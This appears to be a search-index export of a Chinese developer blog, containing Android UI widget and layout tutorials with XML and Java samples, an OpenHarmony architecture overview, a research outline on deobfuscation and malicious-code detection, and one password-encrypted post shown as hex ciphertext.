等。 autoLink 当文字内容出现 URL，E-Mail，电话号码等，通过设置 autoLink 属性，可以使其成为链接，常用类别有 web、email、phone、map 等 fontFamily 设置字体，可以选择系统字体或自定义字体 其中 text、textColor、background 属性的内容在开发中并不直接在控件中写明，而是写在 res\\values\\目录下的 colors.xml、strings.xml 中，然后被控件调用 12345//在strings.xml中声明:&lt;string name=&quot;a&quot;&gt;hello_world&lt;/string&gt;//在控件中引用:&lt;TextView android:text=&quot;@String/a&quot;/&gt; ButtonButton 继承于 TextView，所以 TextView 上很多属性也可以应用到 Button 上 123456&lt;Button android:id=&quot;@+id/button&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Button&quot; android:textAllCaps=&quot;false&quot; /&gt; 在 MainActivity 中为 Button 的点击事件通过匿名类注册监听器每当点击按钮时，就会执行监听器中的 onClick() 方法，我们只需要在这个方法中加入待处理的逻辑就行了。 1234567891011121314public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button1=(Button)findViewById(R.id.button); button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View view) &#123; &#125; &#125;);&#125; 通过接口注册监听器 123456789101112131415161718public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button1=(Button)findViewById(R.id.button); button1.setOnClickListener(this);&#125; @Override public void onClick(View view) &#123; switch (view.getId())&#123; case R.id.button: break; default: &#125; &#125;&#125; EditTextEditText 允许用户在控件里输入和编辑内容。 1234&lt;EditText android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/edit_text&quot;/&gt; Android 控件的使用规律，用法基本上很相似，给控件定义一个 id，再指定控件的高度和宽度，然后再适当加入一些控件特有的属性就差不多了。 基本属性 属性 说明 hint 提示信息 textColorHint 提示文字的颜色 inputType 输入类型，如日期、电话、邮件等 drawableLeft, drawableRight 等 在输入框的指定位置添加图片 drawablePadding 设置图片和输入内容的间距 paddingLeft, paddingRight 等 设置内容与边框的间距 selectAllOnFocus 获得焦点后全选组件内所有文本内容 minLines, maxLines 设置最小、最大的行数，当输入内容超过最大行数，文字会自动向上滚动 ImageView图片一般存放在 drawable 开头的目录下 12345&lt;ImageView android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/image_view&quot; android:src=&quot;@drawable/image1&quot;/&gt; 属性 说明 src 设置图片资源 scaleType 设置图片缩放类型，如 fitStart, fitCenter, fitEnd（等比缩放，位置放置不同）等 maxHeight 最大高度 maxWidth 最大宽度 adjustViewBounds 调整 View 的界限 ProgressBar用于在界面上显示一个进度条，表示我们的程序正在加载一些数据。 1234&lt;ProgressBar android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/process_bar&quot;/&gt; 属性 说明 checked 默认是否勾选 drawableXXX(Left, Right) 文字与选择框的相对位置。需要与 button &#x3D;”@null”一起使用。 paddingXxx 文字与选择框的距离 button 设置为@null 表示不使用默认的选择框 AlertDialog对话框 1234567891011121314151617AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this); dialog.setTitle(&quot;Dialog&quot;);//设置弹框标题 dialog.setMessage(&quot;Something important&quot;);//设置弹框内容 dialog.setCancelable(false);//能否用 back 键关闭对话框 dialog.setPositiveButton(&quot;OK&quot;, new DialogInterface.OnClickListener() &#123;//为对话框设置确认按钮的点击事件 @Override public void onClick(DialogInterface dialogInterface, int i) &#123; &#125; &#125;); dialog.setNegativeButton(&quot;Cancle&quot;, new DialogInterface.OnClickListener() &#123;//为对话框设置取消按钮的点击事件 @Override public void onClick(DialogInterface dialogInterface, int i) &#123; &#125; &#125;); dialog.show(); AlertDialog.Builder 的基本方法 方法 说明 setIcon(int iconId) 设置图标 setTitle(Charsequence title) 添加标题 setMessage(CharSequence message) 添加消息 setView(View view) 设置自定义布局 setPositiveButton 确定按钮 setNegativeButton 取消按钮 setNeutralButton 中间按钮 create() 创建对话框 show() 显示对话框 ProgressDialog1234567891011121314151617181920@Overridepublic void onClick(View view) &#123; switch (view.getId())&#123; case R.id.button: String inputText=editText.getText().toString(); Toast.makeText(this, inputText, Toast.LENGTH_SHORT).show(); imageView.setImageResource(R.drawable.image2); int progress=progressBar.getProgress(); progress=progress+10; progressBar.setProgress(progress); ProgressDialog progressDialog=new ProgressDialog(MainActivity.this); progressDialog.setTitle(&quot;This is ProgressDialog&quot;); progressDialog.setMessage(&quot;Loading......&quot;); progressDialog.setCancelable(true); progressDialog.show(); break; default: &#125;&#125; 布局一个丰富的界面总是要由很多个控件组成的，那我们如何才能让各个控件都有条不紊地摆放在界面上，而不是乱糟糟的呢？这就需要借助布局来实现了。布局是一种可用于放置很多控件的容器，它可以按照一定的规律调整内部控件的位置，从而编写出精美的界面。当然，布局的内部除了放置控件外，也可以放置布局，通过多层布局的嵌套，我们就能够完成一些比较复杂的界面实现 LinearLayoutLinearLayout 称为线性布局，是一种比较常用的布局。这个布局会将它所包含的控件在线性方向上依次排列。线性排列肯定会分为垂直和水平，通过 android: orientation 控制，如果是垂直就是 vertical，如果是水平就是 horizontal。 属性 说明 orientation 布局中组件的排列方式，如 horizontal(水平摆放)、vertical(垂直拜访，即一个控件占一整行) gravity 控制组件或布局所包含的子元素的对齐方式，可以多个组合，以 | 分隔，如 bottom|left 表示位置在左下方 layout_gravity 控制当前组件在父容器的对齐方式 background 为当前组件设置背景（图片、颜色） divider 分割线。与 showDividers 搭配使用 showDividers 设置分割线所在的位置，如 none(无)、beginning(开始)、end(结束)、middle(每两个组件间) dividerPadding 设置分隔线与左右两边的间距 layout_weight 等比例划分剩余区域 12345678910111213141516171819202122&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/button1&quot; android:text=&quot;Button 1&quot;/&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/button2&quot; android:text=&quot;Button 2&quot;/&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/button3&quot; android:text=&quot;Button 3&quot;/&gt;&lt;/LinearLayout&gt; 相对布局RelativeLayout 又称作相对布局，比较随意，通过相对定位的方式让控件出现在布局的任何位置。 属性 说明 gravity 控制组件或布局所包含的子元素的对齐方式 ignoreGravity 设置为 true 将不受 gravity 属性的影响 layout_alignParentXXXX(Left, Right 等) 根据父容器定位。左(右)对齐 layout_centerXXXX(Horizontal, Vertical, InParent) 根据父容器定位。水平居中，垂直居中，中间位置 layout_XXX(toLeftOf, toRightOf, above, below, alignTop, alignBottom, alignLeft, alignRight) 根据兄弟组件定位。根据 id 来设置。其中 toLeftOf, toRightOf, above, below 是参考组件的左、右、上、下边，而 alignTop, alignBottom, alignLeft, alignRight 则是 对齐 参考组件的上、下、左、右边界。 layout_XXX(margin, marginLeft, marginRight, marginTop, marginBottom) 设置组件与父容器的边距（偏移） padding, paddingXXX(Left, Right, Top, Bottom) 设置组件内部元素间的边距 1234567891011121314151617181920212223242526272829303132333435363738&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/button1&quot; android:layout_alignParentLeft=&quot;true&quot; android:layout_alignParentTop=&quot;true&quot; android:text=&quot;button 1&quot;/&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/button2&quot; android:layout_alignParentRight=&quot;true&quot; android:layout_alignParentTop=&quot;true&quot; android:text=&quot;button 2&quot;/&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/button3&quot; android:layout_centerInParent=&quot;true&quot; android:text=&quot;button 3&quot;/&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/button4&quot; android:layout_alignParentLeft=&quot;true&quot; android:layout_alignParentBottom=&quot;true&quot; android:text=&quot;button 4&quot;/&gt; &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:id=&quot;@+id/button5&quot; android:layout_alignParentRight=&quot;true&quot; android:layout_alignParentBottom=&quot;true&quot; android:text=&quot;button 5&quot;/&gt;&lt;/RelativeLayout&gt; 帧布局帧布局。从父容器左上角开始绘制，按组件或布局的定义顺序依次绘制，造成覆盖效果。 基本属性 属性 说明 foreground 设置前景图像 foregroundGravity 设置前景图像显示的位置","categories":[],"tags":[],"keywords":[]},{"title":"open harmony入门","slug":"harmony入门","date":"2024-07-08T08:58:38.000Z","updated":"2024-11-11T09:24:07.319Z","comments":true,"path":"2024/07/08/harmony入门/","link":"","permalink":"http://example.com/2024/07/08/harmony%E5%85%A5%E9%97%A8/","excerpt":"","text":"内核层 内核子系统：采用多内核（Linux 内核或者 LiteOS）设计，支持针对不同资源受限设备选用适合的 OS 内核。内核抽象层（KAL，Kernel Abstract Layer）通过屏蔽多内核差异，对上层提供基础的内核能力，包括进程&#x2F;线程管理、内存管理、文件系统、网络管理和外设管理等。 驱动子系统：驱动框架（HDF）是系统硬件生态开放的基础，提供统一外设访问能力和驱动开发、管理框架。 系统服务层 系统服务层是 OpenHarmony 的核心能力集合，通过框架层对应用程序提供服务。该层包含以下几个部分： 系统基本能力子系统集：为分布式应用在多设备上的运行、调度、迁移等操作提供了基础能力，由分布式软总线、分布式数据管理、分布式任务调度、公共基础库、多模输入、图形、安全、AI 等子系统组成。 基础软件服务子系统集：提供公共的、通用的软件服务，由事件通知、电话、多媒体、DFX（Design For X） 等子系统组成。 增强软件服务子系统集：提供针对不同设备的、差异化的能力增强型软件服务，由智慧屏专有业务、穿戴专有业务、IoT 专有业务等子系统组成。 硬件服务子系统集：提供硬件服务，由位置服务、用户 IAM、穿戴专有硬件服务、IoT 专有硬件服务等子系统组成。 根据不同设备形态的部署环境，基础软件服务子系统集、增强软件服务子系统集、硬件服务子系统集内部可以按子系统粒度裁剪，每个子系统内部又可以按功能粒度裁剪。 框架层 框架层为应用开发提供了 C&#x2F;C++&#x2F;JS 等多语言的用户程序框架和 Ability 框架，适用于 JS 语言的 ArkUI 框架，以及各种软硬件服务对外开放的多语言框架 API。根据系统的组件化裁剪程度，设备支持的 API 也会有所不同。 应用层 应用层包括系统应用和第三方非系统应用。应用由一个或多个 FA（Feature Ability）或 PA（Particle Ability）组成。其中，FA 有 UI 界面，提供与用户交互的能力；而 PA 无 UI 界面，提供后台运行任务的能力以及统一的数据访问抽象。基于 FA&#x2F;PA 开发的应用，能够实现特定的业务功能，支持跨设备调度与分发，为用户提供一致、高效的应用体验。 来源：了解 OpenHarmony 开源项目 基础知识：构建第一个 ArkTS 应用（Stage 模型） (openharmony.cn) Module 类型Module 按照使用场景可以分为两种类型： Ability 类型的 Module： 用于实现应用的功能和特性。每一个 Ability 类型的 Module 编译后，会生成一个以.hap 为后缀的文件，我们称其为 HAP（Harmony Ability Package）包。HAP 包可以独立安装和运行，是应用安装的基本单位，一个应用中可以包含一个或多个 HAP 包，具体包含如下两种类型。 entry 类型的 Module：应用的主模块，包含应用的入口界面、入口图标和主功能特性，编译后生成 entry 类型的 HAP。每一个应用分发到同一类型的设备上的应用程序包，只能包含唯一一个 entry 类型的 HAP。 feature 类型的 Module：应用的动态特性模块，编译后生成 feature 类型的 HAP。一个应用中可以包含一个或多个 feature 类型的 HAP，也可以不包含。 Library 类型的 Module： 用于实现代码和资源的共享。同一个 Library 类型的 Module 可以被其他的 Module 多次引用，合理地使用该类型的 Module，能够降低开发和维护成本。Library 类型的 Module 分为 Static 和 Shared 两种类型，编译后会生成共享包。 Static Library：静态共享库。编译后会生成一个以.har 为后缀的文件，即静态共享包 HAR（Harmony Archive）。 Shared Library：动态共享库。编译后会生成一个以.hsp 为后缀的文件，即动态共享包 HSP（Harmony Shared Package）。 说明： 实际上，Shared Library 编译后除了会生成一个.hsp 文件，还会生成一个.har 文件。这个.har 文件中包含了 HSP 对外导出的接口，应用中的其他模块需要通过.har 文件来引用 HSP 的功能。为了表述方便，我们通常认为 Shared Library 编译后生成 HSP。 stage 模型编译态包结构 ets 目录：ArkTS 源码编译生成.abc 文件。 resources 目录：AppScope 目录下的资源文件会合入到 Module 下面资源目录中，如果两个目录下的存在重名文件，编译打包后只会保留 AppScope 目录下的资源文件。 module 配置文件：AppScope 目录下的 app.json5 文件字段会合入到 Module 下面的 module.json5 文件之中，编译后生成 HAP 或 HSP 最终的 module.json 文件。 FA 模型应用程序包结构 FA 模型与 Stage 模型不同之处在于 HAP 内部文件存放位置不同，FA 模型将所有的资源文件、库文件和代码文件都放在 assets 文件夹中，在文件夹内部进一步区分。 config.json 是应用配置文件，IDE 会自动生成一部分模块代码，开发者按需修改其中的配置。详细字段请参见 应用配置文件。 assets 是 HAP 所有的资源文件、库文件和代码文件的集合，内部可以分为 entry 和 js 文件夹。entry 文件夹中存放的是 resources 目录和 resources.index 文件。 resources 目录用于存放应用的资源文件（字符串、图片等），便于开发者使用和维护，详见 资源文件的使用。 resources.index 是资源索引表，由 IDE 调用 SDK 工具生成。 js 文件夹中存放的是编译后的代码文件。 pack.info 是 Bundle 中用于描述每个 HAP 属性的文件，例如 app 中的 bundleName 和 versionCode 信息、module 中的 name、type 和 abilities 等信息，由 IDE 工具构建 Bundle 包时自动生成。 混淆： 一种通用、高效的轻量级代码分析技术，对外源代码进行逆向工程、解码分析和结混淆，并保证代码的语义一致性; 寻求一种高效、通用的神经网络检测模型，在硬件限制下保证混淆恶意代码的检出率。 口 代码分析层面:(1)代码解混淆时间 (2)代码逆向成功率 (3)语义一致性分析 口 恶意代码检测层面:(1)模型运行时间 (2)模型性能指标分解目标 口 基于 Linux-AOSP 的 Android 逆向: 测试 OpenHarmony 对安卓平台恶意软件的兼容性，总结目前的 Java 混淆技术，开发或改进现有的反编译、解包和解混淆算法。 口基于 Lite-OS 的 JavaScript 脚本解混淆: 总结目前的 JavaScript 混淆技术，开发或改进现有的解混淆算法。 情景举例: 开源 OpenHarmony 的方舟编译器提供了多种混淆技术，对字节码进行混淆，从而保证 HarmonyOs 应用包内代码难以逆向和分析。 考量点: (1)代码解混淆时间 (2)代码逆向成功率 (3)语义一致性分析口","categories":[],"tags":[{"name":"harmony","slug":"harmony","permalink":"http://example.com/tags/harmony/"}],"keywords":[]},{"title":"多内核开源0S的外源恶意代码检测","slug":"多内核开源0S的外源恶意代码检测","date":"2024-06-30T13:50:35.000Z","updated":"2024-07-17T07:08:40.704Z","comments":true,"path":"2024/06/30/多内核开源0S的外源恶意代码检测/","link":"","permalink":"http://example.com/2024/06/30/%E5%A4%9A%E5%86%85%E6%A0%B8%E5%BC%80%E6%BA%900S%E7%9A%84%E5%A4%96%E6%BA%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/","excerpt":"有东西被加密了, 请输入密码查看.","text":"47b49a4a2f06ffaeeb6d37e9691a4c667493fd8e6e9b46793c868899f0c12acf016f4fb8e0755a062dfcd0ef771ef582f36bd8e7401d96fbedb1fd2ec6c76e93880fdaae2d7108263687fb1a8662748ede940f157f3acb5302a3ba9758e33361856d59c2e432e13f3f877eb5f5c10280ca33c7ba5f1dad856242e5655330b8bcee5d7ff8778ee8fbb4650dd013d94b3d556cf4cce37f1a0b728ffdeeebb6622e7039daa803b331ea4cfe39fb704f94c3ecc5fe7face9f469208f7759e436198087f65c64dbf83c7ce8a32be361441b68e8565e64aba40b0c91beb762e4731284cb8d4bad4be687e7c9100227488a7f6db1d54437ed8d659ed6d704ef81c3d56717a7f857207dc58f737ed1724ff6e1e883a69a79d13812a23d06371d2fa37ceeef63b3ed5ca29657b218ad9656f5260ab770258277b59d17bdf14861df044c5bd9b4e165119ba6ab058f44c715da1cca216db604cfcad60ee4c9e449966a108d3123cda8038dbf2e30d84895c0c81b5f3d3aaf4d5a0dd7597c28930be9ac7de7590278921024d3097fa3dd90a4cef376cdf66240eb77af3f6e5a4a9e267a9cb3a80f4748663ca69a0ef38b3a73e0b8397324b5b659515ffce0a6ae70feef807398db4d39e32dc4b1e418462839b830aabcc2701da94c8ff1932e2f7b042fc5db6badea1137cb2b0ddeeb0cf524d724b1da093dd0fb13d331d5547015f48f6f3e94bdec88a533f20e51d4b70f870c60b2629de1d5ae3ba166af4a7688e6b28e7944b58f65e08a0e0ea7e683e8f56499edd86595da6324998e951f7f8fa9a605a048ba0fbd86a25bdc7710d8d2840746f056be07603f027934776c67a6020d31cbbf63984c9a5405b7b596dd6c93d95ee56a2434ab585c115c621bb85d39b91e2db002a9f71fbba32976e27b5e5a3459bf8d9baf9f5568d355471e2a99d8a63ef3c502ea1e2253b24d198a36a73f28de9abf7c935220f874aa8f27bc7eca43925bfa3fce053296b11d5212c9e0caa6c979338b0846714dccbae36546fbb929620bddf75a987f04a787886a4908506fb84685b6a9f5a07f48db77fd541617944582fcd7e876e600f239dfebae1b8edfc4e368ffc3d04cc0dac7ab41cbcac5ebdbd43ac50590ee214bcf547bbb8aefb6e2f1330bc53e1176cfad71640e3f9126adf4454b7dfef95964ad8b514fade42c3d7ee879d8113ef7fb723d67878fb66cc2a5bd6d78e9c179925f1cdb825fe669f0539d61016ac6dfb27ac9de6765811b0b98e7e2b3564fc683e0a303351a49b65c7834be748eefa6e9ab22486a508a94cf53ec2f5671679a099a656894602dbe1e9b8a34b498b9fe3b40661dc848d1aa5a5bf7b9d17f1a3278ee78c455ed263a183f9ca526ea35eab7a0d2f9868a2e143099656c854aa88bc7ba21bbe19595d8fbd3b54353fef8bf353639379c4f8735ffea9606afd59ee04dbacb86f739cd5c3bc315055646b5e17c18a4f595808d14180c1948df163e9cd46adbc7c6014c2f237c0a7176b93443bbcb107ec7bdc1ced5eccc11ce820db6823bd35fb836f13d2be67a6d124beba10e6ebe4eda61c5afdad9161fb163cef9f735326a1539c098b58356803d5d83bab59b5abeadf07b85ae2a9d7a551f129ef9688f0fe117b419b0256e120c4a2173ee9eb1b925bda53ab7e65c81a8eb77bd1982de9a8824137307343e2d2f27a7977f3bfc439ce1cf1c4ce9f7a381986e8878ed20d1fdb7875d54080631c242bdc81d1e7191b55a461504af8db79380c54a07fc1de90e73d713a4a653a76a9d895059f7abd3b6d39fa56abde1e4a98265977737034ec16e5145bfc1ab9664ce9897f2f28ecf27b70fe4c0dd130e32c023fe842ef90af1646871cb967cb2777eed60cb7af0d798920e75a1f7eaca9ae1d7bf77de3903c81b1b655f51d4042ce4cb75f4c28a5f17f021c028cab4535165912109ee9c2b688d3ceb4457ae265aa541d2e34dfb43847045ae999f4bc1c42bcf8182eaafe54b63291fbcbcb704b00e5745fc6876bc01c2311519f9312750fdaa97e55812077def814ab006039c7470581ac53c016df776e38ae75897c4a7f1ea567da347647a22984462229143746971cac853336167ec07c29dfb6ac820c39439d911d238750a5c5f6faf2e43ae6f3afd4e2fd0de53fbda3cee5856ce90d4cd1b87878ecd5555c89de26abae764487860c7c425286551b297e1d742d4f6d04d83d842c30d2ce216f59a73c122fa80299dabcc4aeec0a1d563a98462c9d921aaa31c4b7dc423761d0cef3dcf2233f1a926b691ad3848614cc142940f97066f0c6fae9db0e2f5c0dd9718187da8d856aec00eae569b379e5015aee2bc2bafeef705a96314657a27ff978f457708b88bd8f4ce1baaed2a9412ccb0d7e0cdf16d1789a3f138b4568cdf562c6f7d8727ea922afdf381cb696f32253fecbaf1ebc3f8223b9fdc2096f90590a9f277ad539f48860eee5460dc87cf6f0f0d12b03988fa1d56779373ec56dd05d720da907b0baec804247c9d042e3e8ded9346e4548ff0d2b8f7481f9eec83dee79615bcd59795252bf5d22ad007d9e4c778479bca68f20ca21c50c5965016389f978983e290280ae0f7ca8e590bdf4e647e5140136a9e4c8b5fe9c2d469f885c79da7afa8c87164be2cb97bddcd3027ac7cb00fafed537b8bdbeaa77f636a1b41157aa80ff9909a691f62794b952f6a4218ec9636612c3b13d1e0193ea59bd73662596b7d390fda92779b932f71927f64144e1fb2e1d68c057ed183898bbc55448ea3ac262e61e1ecb0356838c21c423a35d386bc9ae86f89c0df5ae4a0816fa96711561db479df98c50034d264c19e9da0e6883f7ec59d6bf07f6d2ba5c54922a5d908daefef29eb671a6745a67d86dd75cf471b1673d450dcb2d3c37173b229ffc4df40b0be5583a454ac25f108ad85684ae831cffa412a2bafa2cce1a4a7caa797823793d1e05b40123d310711f8696b96fe83b5ea8dcad1fc5196570ce5d209784e7cc5c5b1bd3582dbc06f8b2ba4152d6a4e0e4bb29dff05aba0a563cc04f349e0cdbd3d2436a807fa4c0abe1fbdeb24d0553733011649da14a322e8fad475ca35dcb24afd6715060a70c35ff6cd2e29cc9f2f680c834ff6dc98644506e35e62eca802817fe1d9654f941c60da2db6092118943a73a5f3aecda3d41c84e3f208c849967a75fa5e4c92ed3670ba1e3294c0ee8956d833bb56b8281e68faa4ee781b52284cc0d080ec670556a14b77f88bb46b2bf2667f68190e1b771c36fe104c955c52accb33aaea4a5d7b886887f874db359c8bb6d10e83ae9d9f9128572d0cb174381fe04540413321e29c0eacae1452f8807317e50f777e0cd2667661b82d6c6e8d2d30eaace38a8282989c07029c9909b42b5a141ad19d09064d6591b34c908a23a528fef921e5a43efbf8d0629865a8d38da60138dd67aae08244649e5b904a1a56191b87718a9c4f667f518b69cb96205430b962bf5f44797df4ad1543cb5711bd652d2873169652ec829d9f0c4f178286892914f48f3aca7b28771010a48fc753bd6696f6a7ee2cdc6ad293cf843f19de311ce4ce3b5e442b451933d102dcaff7401ab5bc20eda48f60ab989923238465a4c0b124c39f2ec5a046989c36f05ed1dda9e90385c62b9c91848debe266fbfa4ed9db6416fb49b153c54a5dceae00f03db5cfe29d682f8b0f7773d06e3bccc6a3ca96d7dc521077a8bdb17b2fca0f240bfe88d26053cc1f6e30037a692819cc268e39ec14149fc4b48cd4775d0c0994bf17714f857603a48dada41ed5c09d57cb81a916c0059a437f7003219ff54344a4f9c65045a86cd4cd2fce9105e2d7cb22149e9b8daf27e96f4c4b567c412d32e701a1d3f76b599da4a64f13cbcde1851054480fce4b74a3144e4c4efb4f8a7d40e684577363367ef7426ccf6b8b0ef005dc2e34efb85e77fb4cc12f2b1f77f808bf2230bb7cb70e5fcb28f8d959966c932670517d9d789bc6f5c46ac75c789ac56f07ac76c32267cd32d232fcf55298ebb65bdb411b15e9264ee220ce8a7c1fe3d20f4b29d30343a60a6f0aa17e13f1eaafed98b3dbc003824db5d30767ea0d083dc2779636146424aaca0bfa7481d5a14d1182dc6c094f207a3db0ccdd083c368d3f476c303ca1c565900b462019b6b8579cb666eda2ff788c6da9a44607e031123f203af1742fb871825e7fc3bc5d83a9c6780faf8b34aa53b7ab387c1016781f2373f4a6f78a6cceada5d70166c43b4b3cf21bee5b1bc987cae55f864542bc5322c6d696b51a0d6c728dd48c21f629af03167de4b90309985a11551f1e849d8acf60692017e433f8617e73a9471b64cc7591019e639b124767ec3a6a4bd5a4e15b56faa45e52d8a2ea2be0c42b66767b39713cfdafd899873755634eceda9f7a1b2c7522794b58c095b17b2fd0c53b9e7419a6ffbe88780c92261a6bc0041c17d8383ac86c18b27dcf856aad97b0b34041b66ed2a3a5d7d458bb08e97eadc009b9fd331b8bfe676655ab20b0ff7f9efc971cf6adab537c30428d5965000ed6fd897a4a4e1e2be63b88aabba5f9b10354b251a17057d7b3c1ff0db6c3ae34c48e29b5eaff80671d8a7ea4a37de1a72e547a0b7e8651d085e13baf0bfb6d51fe77f7103429c52539af4d1517901f52cab78becbc56b901c44fbe81917aad9037a5d0b2701b40d03d6fef2fd874ec871c5d42e66eca1f969a382edefe2f4f32af14c95be2ca5f62c774938329bb6995569088b2374b7ec2a654de6b649c5df9ac4ff0b8a1a24cfa0e78e8f8a1a61fab9c3e2c7ce071b35f4a9cb2ccfdef729d02dc154a6fe8600a75c47cc712f217d74ab50e43ce5facf865312d352f359e0cf6fe5f88f79586ab0113f2e2974169887c86635fb67271a5dac5c8d1101b8b9e41ccd61e659046ef4c5aad4cf987b19180d9c86773797ba7315c940aa682716d1e34b4e674d91dc5f611b1de18ca74f232862962ea85ce9280a3b90e88cde1258e0ca864646cc67d10e3a72b94ae695a62c8291e81cd3852fb3ac870ce3da4ad745c19398bb2c8328c58e26f2f103ba9e16759b95a5f9a73bc26e3e5175dcfb0065b61919db2f7630866855a7a3047811051d9ef672271cbe0d4196f31e1025f4507ce77853bf4fb361259db423cdd025027362d618748559cb742a17b3987071681c010636631dc738bc82e4cd9b74d042b21537674aacdf892c416300719c57e8dc83c87acee94a3be4e2d2c4347618f905d11b5bd22143a4db311f4d2b1df5c51495f40bb6af8a748ae93ba28f8c894679c7cab3ad15b1bb20868e69af539f111a6f5f1c3c6ffff7cc109f5f4fcea41371fef27c288de4dc26889789642fc0dab355b3d58e88764e02b8b8d344ad084a2fcbd590fd292a64a30b4ca2bfab18808bd6de00517dc4454ef72d98da7834dcd5e245a65bc72f5a2a6ef65bf0a80569b466af230e695b882520282dafffc8b2d2ea72694f6d961940f9ee64068f522776dfe7e58348278f81806e363486b863ba2b61b32a790909ca6f67e8bf147de682c6382e8e6e8107786f443942f73ea6ef31a5069d13aec28789f846891aa7d23975d51f683e95d2a802d95a7c4146bad194560c68092000cd1bb54af3f717370325395c96f14d79b0d2a9b963e58c07715098336ed75311a8b5c1e067d70353aa3e2d8e8448446a6e5c13665e783a6dc62ac0bd41829e28874e8cf38640bd1c5843611aaa06fb126efc6a5b6707250a0aa3cd601f73a1c82f2b4139c54692955bfcff0ce5fa8bef7560d2bcf0262d515542ea884177c5b096cb5bdc055e8add26a091901f669e9f1b600f028d0ae1ad9d231902ba99755a990fca6fc86e163ca4ecdb4b2b148da957b5dafd5b8bac1af227f39bd71b1aef6e8cf1a5416370bbf499fe00aa2455b87e89f21db2a6476379d1e3b81f40a01999975dd8b40c267b8de47e95ea3ec7b2d282d240d85ac2498691283e1325bdad652484842a2d46e6313b05b5634b2c69ef24c0e74b8f7d28f66dc00b15951e36be0310db4b3ccd98d08683604de26de17e198e1866f28d12307c436001865d6d0a188950e53ab67dd405a4e5b19a97e8719265ffce18129815a2721d4e2fbbe5251066d9927fd0784a5bf8b3f9b192855eaecc7c22661b219422106d623d14bf61aa94d2b8d39b2aca375c990a3868a5fa22ead40272f0896c7860053df2a8ccc464b4d2dec6c534ef143a6c651fca1189e67426e8dbd9cf9d61d272a1aad9a1c32c4cbe3faa9bfd98f6ceb71bc1c40140c4d5f9690f95c22a96a5b75d2324b64ca5d660bc1bbe700849625bbec63ed381ffe1532248e8592fd493a774fe59b68ed527bba190c19c6e0ac8f3f7c93bd2539b7da24000b049720407434374b75d9f94ec7775321844c261f753eca314557e2ddbb7d8847ddd2e5c3119025c86e01c3d362bafdefffe992913507586e1a1eb988e9be73ded8d6f7b0a9432b8f68bb497e55ef71c216a0edd58e37beca706a825412e2026f483c59e5ab6f3468ca84a911a9d06cc9d03af5a8245cb11bac2cfc5c987ef1f23c8de9d6128916b11e62a42841bfccbcf625bb92fbfeb9cc73706024fa55647591bc49c17253f3acfe90006f435bb79b8b32f3e4b43bc774772b19e78deb660b2137bb2d2bfa56a30071363b01324f82819108e4eb2bc18568ce64903fc18c7b85a9faf8e7430a3b68fbd06ba1950de4112222de0faa6c371cccfd062ee1c29dbae6543f7e4a7652c5fc49e71359c773185d6d0ee50bc984cd85f92df878008cea194b6dab21f6bf33d85d2901db5426ad9e2b1b67d42cf0aad8589038c73693ba139096f63ee6b37e2b1f8547c237f67e76e9167d47283375478a3e1548c468880046ffd1b5da0d58485017db37ae67e389ced924762852e8660aa38d985e4473bf3255ebb33d5d849901f61e53b25fbb4da5550cf7c6eda759a59ac430a7ad0463d4d671a6fa84268ba1bb416cb1d5f7d8004da937fff39b98264c7688b835c10368922bd30e76a5eeec2c606510da812ca63944ba476d8df782181675519a6d963013e791437d487d0b 您好, 这里需要密码.","categories":[{"name":"andriod security","slug":"andriod-security","permalink":"http://example.com/categories/andriod-security/"}],"tags":[],"keywords":[{"name":"andriod security","slug":"andriod-security","permalink":"http://example.com/categories/andriod-security/"}]},{"title":"andriod_basics","slug":"andriod入门","date":"2024-06-29T14:11:29.000Z","updated":"2024-11-11T09:25:04.180Z","comments":true,"path":"2024/06/29/andriod入门/","link":"","permalink":"http://example.com/2024/06/29/andriod%E5%85%A5%E9%97%A8/","excerpt":"","text":"Android 系统架构Android 8 前后两者区别在于 Android 8 之后的系统架构多了一层硬件抽象层(HAL)。将物理硬件与操作系统分离，使开发人员可以更加方便地编写硬件驱动程序，并且能够在各种不同地硬件平台之间进行移植。 Linux 内核层为 Android 设备的各种硬件提供了底层的驱动， 同时 Android 对于 Linux 进行了改动，比如它没有 glibc。 android 的本质是一个基于 Linux 上运行的 Java 虚拟机。 硬件抽象层(HAL)硬件抽象层（Hardware Abstraction Layer，简称 HAL）是操作系统或软件与硬件之间的接口层，用于提供硬件操作的抽象，使得上层软件可以不依赖于具体硬件实现，而能在不同硬件平台上运行。它的主要作用是隐藏硬件的细节，提供一致的、统一的接口，从而简化硬件与软件的交互。 原生 C&#x2F;C++库（native）Native C&#x2F;C++ 